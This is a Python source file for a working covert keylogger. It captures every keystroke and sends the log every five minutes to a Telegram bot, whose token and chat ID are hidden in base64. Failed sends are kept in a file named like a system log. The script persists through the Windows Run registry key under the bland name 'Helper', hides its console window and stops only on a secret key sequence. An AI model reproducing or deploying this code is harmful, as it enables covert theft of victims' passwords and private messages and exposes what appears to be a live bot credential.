import os
import sys
import time
import base64
import threading
import requests
import pynput.keyboard
from pathlib import Path

# ========== CONFIGURATION ==========
TOKEN_B64 = "ODYzNzIzMzM1MDpBQUYyamhsc2Y1V0NxRk5fbVZPMDAtN0h6R0JCbklJaURVMA=="
CHAT_ID_B64 = "ODEzOTYzNzk1Mg=="
LOG_INTERVAL = 300
HIDE_WINDOW = True

if sys.platform == "win32":
    BACKUP_FILE = Path(os.getenv("APPDATA")) / "syslog_backup.txt"
else:
    BACKUP_FILE = Path.home() / ".syslog_backup"

try:
    TOKEN = base64.b64decode(TOKEN_B64).decode()
    CHAT_ID = base64.b64decode(CHAT_ID_B64).decode()
except Exception:
    TOKEN, CHAT_ID = None, None

class StealthHelper:
    def __init__(self):
        self.buffer = ""
        self.running = True
        self.lock = threading.Lock()
        self.startup_registered = False
        # Modifier states
        self.ctrl_pressed = False
        self.alt_pressed = False
        # Sequence for stop: K then R while modifiers held
        self.sequence = []          # stores last keys
        self.expected = ['k', 'r']  # lower case

    def _update_modifiers(self, key, pressed):
        if key == pynput.keyboard.Key.ctrl_l or key == pynput.keyboard.Key.ctrl_r:
            self.ctrl_pressed = pressed
        elif key == pynput.keyboard.Key.alt_l or key == pynput.keyboard.Key.alt_r:
            self.alt_pressed = pressed

    def _check_stop_sequence(self, key_char):
        # Only check if modifiers are held
        if self.ctrl_pressed and self.alt_pressed:
            self.sequence.append(key_char)
            if len(self.sequence) > len(self.expected):
                self.sequence.pop(0)
            if self.sequence == self.expected:
                self.running = False
                return True
        else:
            # If modifiers not held, reset sequence
            self.sequence = []
        return False

    def process_key(self, key):
        # Update modifier states on press
        self._update_modifiers(key, True)

        # Check stop combination (K then R)
        try:
            if hasattr(key, 'char') and key.char:
                char = key.char.lower()
                if self._check_stop_sequence(char):
                    return False   # stop listener
        except:
            pass

        # Logging – skip modifiers themselves
        try:
            k = str(key.char)
        except AttributeError:
            if key == key.space:
                k = " "
            elif key == key.enter:
                k = "\n[ENTER]\n"
            elif key == key.backspace:
                k = "[BACKSPACE]"
            elif key == key.tab:
                k = "[TAB]"
            else:
                # Ignore other special keys (shift, ctrl, alt, etc.)
                k = ""
        else:
            # Only log if it's a printable character
            if k:
                with self.lock:
                    self.buffer += k

    def on_release(self, key):
        # Reset modifiers when released
        self._update_modifiers(key, False)
        # Also reset sequence when modifiers are released
        if not (self.ctrl_pressed and self.alt_pressed):
            self.sequence = []

    def send_to_telegram(self, text):
        if not text or not TOKEN or not CHAT_ID:
            return False
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        for i in range(0, len(text), 4096):
            chunk = text[i:i+4096]
            for attempt in range(3):
                try:
                    resp = requests.post(url, data={"chat_id": CHAT_ID, "text": chunk}, timeout=10)
                    if resp.status_code == 200:
                        break
                except:
                    time.sleep(2 ** attempt)
            else:
                self.save_backup(chunk)
                return False
        return True

    def save_backup(self, text):
        try:
            with open(BACKUP_FILE, "a", encoding="utf-8") as f:
                f.write(text + "\n")
        except:
            pass

    def send_and_clear(self):
        with self.lock:
            if self.buffer:
                text = self.buffer
                self.buffer = ""
            else:
                return
        if not self.send_to_telegram(text):
            with self.lock:
                self.buffer = text + self.buffer

    def periodic_sender(self):
        while self.running:
            time.sleep(LOG_INTERVAL)
            self.send_and_clear()

    def add_to_startup(self):
        if sys.platform != "win32":
            return
        try:
            import winreg
            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "Helper", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            self.startup_registered = True
        except:
            pass

    def run(self):
        if not self.startup_registered and sys.platform == "win32":
            self.add_to_startup()

        sender_thread = threading.Thread(target=self.periodic_sender, daemon=True)
        sender_thread.start()

        with pynput.keyboard.Listener(on_press=self.process_key, on_release=self.on_release) as listener:
            listener.join()

        self.send_and_clear()

if __name__ == "__main__":
    if HIDE_WINDOW and getattr(sys, 'frozen', False):
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    try:
        app = StealthHelper()
        app.run()
    except:
        pass
